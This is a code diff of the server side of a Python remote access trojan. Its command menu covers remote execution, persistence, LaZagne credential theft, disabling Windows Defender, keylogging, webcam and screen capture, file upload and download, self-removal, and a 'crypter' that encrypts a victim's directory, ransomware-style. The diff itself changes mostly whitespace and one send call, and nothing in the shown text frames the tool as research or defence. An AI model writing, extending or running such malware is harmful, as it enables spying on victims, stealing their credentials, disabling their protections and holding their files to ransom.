@@ -9,6 +9,8 @@ class Server():
         self.host = host
         self.port = port
 
+
+    
     def receive_all(self, sock, size):
         data = b''
         while len(data) < size:
@@ -18,7 +20,10 @@ class Server():
             data += packet
         return data
 
+
+
     def send_file(self, client_socket, command):
+        client_socket.send(command.encode())
         parts = command.split(' ', 2)
         cmd, filename = parts
         try:
@@ -26,8 +31,7 @@ class Server():
                 while True:
                     data = f.read()
                     if not data:
-                        return "There is not content in your file"
-                    client_socket.send(command.encode())
+                        print("There is not content in your file")
                     client_socket.send(data)
                     response_size = struct.unpack('>I', client_socket.recv(4))[0]
                     response = self.receive_all(client_socket, response_size).decode()
@@ -35,6 +39,8 @@ class Server():
         except Exception as e:
             return f"Failed to send file {filename}: {str(e)}"
 
+
+    
     def receive_file(self, client_socket, command):
         filename = command[9:]
         try:
@@ -88,6 +94,8 @@ class Server():
             client_socket.close()
             return f"Failed to send command: {str(e)}"
 
+
+    
     def register_key(self, client_socket, command):
         _ = True
         try:
@@ -129,10 +137,6 @@ class Server():
 
 
 
-
-
-
-
     def start(self):
         _ = 0
         n = 0
@@ -159,51 +163,65 @@ class Server():
                         client_socket.close()
                         break
 
-
+                    
                     elif command.lower().startswith("exec"):
                         print(self.send_all(client_socket, command))
 
+                    
                     elif command.lower() == "get_system_info":
                         print(self.send_all(client_socket, command))
 
+                    
                     elif command.lower().startswith("web-open"):
                         print(self.send_all(client_socket, command))
 
+                    
                     elif command.lower().startswith("pop-up"):
                         print(self.send_all(client_socket, command))
 
+                    
                     elif command.lower() == "persist":
                         print(self.send_all(client_socket, command))
 
+                    
                     elif command.lower().startswith("lazagne"):
                         print(self.send_all(client_socket, command))
 
+                    
                     elif command.lower() == "help":
                         print(self.send_all(client_socket, command))
 
+                    
                     elif command.lower() == "dir":
                         print(f"File in directory:\n{self.send_all(client_socket, command)}")
 
+                    
                     elif command.lower().startswith("cd"):
                         print(self.send_all(client_socket, command))
 
+                    
                     elif command.startswith("upload"):
                         print(self.send_file(client_socket, command))
 
+                    
                     elif command.startswith("download"):
                         print(self.receive_file(client_socket, command))
 
+                    
                     elif command.lower() == "crypter":
                         key0 = self.send_all(client_socket, command)
                         print(f"Directory encrypted! Your key: {key0}")
                         chk = True
 
+                    
                     elif command.lower() == "ask_permission":
                         print(self.send_all(client_socket, command))
 
+                    
                     elif command.lower() == "disable_defender":
                         print(self.send_all(client_socket, command))
 
+                    
                     elif command.lower() == "decrypter":
                         if chk:
                             key = input("Enter the decryption key:")
@@ -215,19 +233,25 @@ class Server():
                         else:
                             print("There isn't to decrypt")
 
+                    
                     elif command.lower() == "screenshot":
                         print(self.receive_image_from_client(client_socket, f"screenshot{_}.png", command))
                         _ += 1
+
+                    
                     elif command.lower() == "auto_remove":
                         print(self.send_all(client_socket, command))
 
+                    
                     elif command.lower().startswith("keylogger"):
                         self.register_key(client_socket, command)
 
+                    
                     elif command.lower() == "grab_cam":
                         print(self.receive_image_from_client(client_socket, f"self{n}.png", command))
                         n += 1
 
+                    
                     else:
                         print("Invalid command. Type 'help' for list of available commands.")
                         continue
